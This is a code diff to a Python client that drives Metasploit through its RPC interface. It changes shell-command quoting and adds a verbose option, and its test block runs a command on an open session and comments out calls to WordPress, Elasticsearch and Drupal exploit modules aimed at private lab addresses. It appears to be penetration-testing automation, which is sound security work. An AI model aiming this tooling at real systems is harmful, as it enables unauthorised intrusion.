@@ -45,7 +45,7 @@ class MsfClient():
         if os == 'linux':
             command_string = f'{cmd}'
         elif os == 'windows':
-            command_string = "cmd /c " + re.escape(f'{cmd} || echo error')
+            command_string = f'cmd /c "{cmd}"'
         else:
             raise RuntimeError(f"Unknown OS {os}.")
 
@@ -64,7 +64,9 @@ class MsfClient():
                 return ""
 
         result = find_between(result, '[*] Response: ', '[*] Post module execution completed')
-        return result.rstrip()
+        result = result.rstrip()
+
+        return result
 
     def wait_for_job(self, job_id, timeout=0):
         seconds_elapsed = 0
@@ -93,7 +95,7 @@ class MsfClient():
         self.logger.info(f"Opened new session #{session_id} for {rhost}")
         return session_id
 
-    def run_module(self, module_type, module_name, module_params, payload_name=None, payload_params=None, forced_params=None, run_with_console=True):
+    def run_module(self, module_type, module_name, module_params, payload_name=None, payload_params=None, forced_params=None, run_with_console=True, verbose=False):
         self.logger.info(f"Executing {module_type}:{module_name} with params {module_params}")
 
         module = self.client.modules.use(module_type, module_name)
@@ -103,6 +105,10 @@ class MsfClient():
                 module.target = pval
             else:
                 module[pkey] = pval
+
+        if verbose:
+            module.runoptions['VERBOSE'] = 'true'
+            module.runoptions['DEBUG'] = 'true'
 
         if payload_name is not None:
             payload = self.client.modules.use('payload', payload_name)
@@ -288,7 +294,7 @@ class MsfClient():
         result = self.run_module(
                         module_type = 'post',
                         module_name = 'multi/gather/ping_sweep',
-                        module_params = {'RHOSTS': rhosts, 'SESSION': session_id},
+                        module_params = {'RHOSTS': rhosts, 'SESSION': session_id}
                 )
 
         result = [line for line in result.split('\n') if 'host found' in line]
@@ -359,9 +365,12 @@ if __name__ == '__main__':
     import random
 
     msfclient = MsfClient('msfpassword', '192.168.0.100')
-    
-    msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
-    msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
+    # print(msfclient.get_sessions())
+    msfclient.run_shell_command(3, 'DIR C:', os='windows')
+    # msfclient.scan_ping_sweep('192.168.0-1.100', 1)
+
+    # msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
+    # msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
     # msfclient.exploit_elasticsearch_script_mvel_rce('192.168.1.100')
 
     # msfclient.exploit_drupal_coder_exec('192.168.1.101')
